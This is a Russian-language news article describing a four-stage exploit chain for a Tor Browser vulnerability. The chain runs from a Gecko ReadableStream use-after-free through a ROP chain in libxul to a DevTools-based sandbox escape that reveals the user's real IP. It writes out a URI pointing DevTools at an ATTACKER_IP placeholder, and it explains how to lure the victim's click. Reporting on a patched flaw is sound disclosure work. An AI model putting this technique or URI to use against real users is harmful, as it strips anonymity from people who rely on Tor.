# Уязвимость в Tor Browser, позволяющая узнать реальный IP-адрес пользователя

## Краткое содержание

Исследователи компании Calif опубликовали технику эксплуатации уязвимости CVE-2026-92027 в Tor Browser. С её помощью атакующий может деанонимизировать пользователя и отправить прямой запрос, используя реальный IP-адрес сетевого интерфейса жертвы, полностью обходя сеть Tor. Для успешной эксплуатации достаточно, чтобы пользователь кликнет по ссылке или кнопке на странице, контролируемой атакующим. Таким образом, ни сложная инфраструктура, ни многоэтапная манипуляция не требуется. Уязвимость была устранена в обновлении Tor Browser 15.0.23, вышедшем 15 сентября.

## Полная статья

Исследователи из компании Calif[опубликовали](https://calif.io/research/tortilla-with-onion)технику эксплуатации уязвимости ([CVE-2026-92027](https://security-tracker.debian.org/tracker/CVE-2026-92027)) в Tor Browser, позволяющую деанонимизировать пользователя и инициировать прямой запрос с IP-адреса сетевого интерфейса в обход сети Tor. Для эксплуатации уязвимости достаточно, чтобы пользователь нажал на ссылку или кнопку на странице атакующего. Проблема устранена в выпуске[Tor Browser 15.0.23](https://blog.torproject.org/new-release-tor-browser-15023/), опубликованном 15 сентября.

Логика работы эксплоита разделена на четыре этапа. На первом этапе эксплуатируется уязвимость ([CVE-2026-92027](https://security-tracker.debian.org/tracker/CVE-2026-92027)) в реализации API ReadableStream, присутствующая в браузерном движке Gecko и приводящая к обращению к памяти после её освобождения. Для работы эксплоита требуется открытие дополнительного всплывающего окна, работающего в том же контексте, что и основная страница (same-origin). По умолчанию Tor Browser блокирует автоматическое открытие всплывающих окон, поэтому для начала атаки требуется явный клик пользователя, для стимуляции которого, например, можно вывести подставную форму подтверждения передачи Cookie или крупный баннер с кнопкой закрытия.

Отдельная страница необходима для обработки потока[ReadableStream](https://developer.mozilla.org/en-US/docs/Web/API/ReadableStream)в режиме[BYOB](https://developer.mozilla.org/en-US/docs/Web/API/ReadableStreamBYOBReader)(Bring Your Own Buffer). Исходная страница создаёт поток, а всплывающее окно выделяет буферы (Uint8Array) для чтения, размером 64 и 512 МБ. Из-за ошибки при работе с памятью, возникающей при передаче буфера между разными контекстами движка Gecko, можно добиться обращения к памяти после её освобождения. При вызове controller.error() во время чтения потока, движок отменяет операцию чтения, очищает буферы и удаляет ссылки на них, но при работе сборщика мусора возникает ситуация, когда память уже освобождена, но во всплывающем окне остаётся неудалённая ссылка на освобождённый буфер, которая может использоваться как примитив для чтения и записи в области размером 512 МБ.

На втором этапе эксплоит применяет полученный примитив для поиска в памяти указателей на таблицы виртуальных методов (vtable) библиотеки libxul, а также манипулирует внутренними структурами аллокатора mozjemalloc, чтобы вычислить абсолютный адрес контролируемой области памяти и перезаписать указатель на[Observer Service](https://firefox-source-docs.mozilla.org/browser/places/notifyObservers.html)в libxul. При помощи возвратно-ориентированного программирования (ROP - Return-Oriented Programming) из уже имеющихся в libxul кусков машинных инструкций, завершающихся инструкцией возврата управления, формируется цепочка для выполнения своего кода внутри sandbox-окружения процесса отрисовки. Для запуска подготовленного кода после подмены указателя на Observer Service достаточно вызвать метод console.error().

Для обхода sandbox-изоляции эксплоит подделывает внутренний объект SessionHistoryInfo и создаёт запись в истории навигации с URI "about:devtools-toolbox?type=process&host=ATTACKER_IP&port=9192". Далее эксплоит инициирует перезагрузку страницы, что приводит к открытию интерфейса со встроенными инструментами для разработчиков (DevTools). Обработчик DevTools запускается в родительском процессе с правами System, извлекает параметры host и port из URI и вызывает метод DevToolsClient.socketConnect для удалённой отладки, что приводит к отправке сетевого запроса на указанный атакующим адрес. Так как в DevToolsClient.socketConnect не учитываются настройки SOCKS-прокси, используемые для перенаправления трафика через сеть Tor, запрос уходит напрямую с реального IP-адреса пользователя.
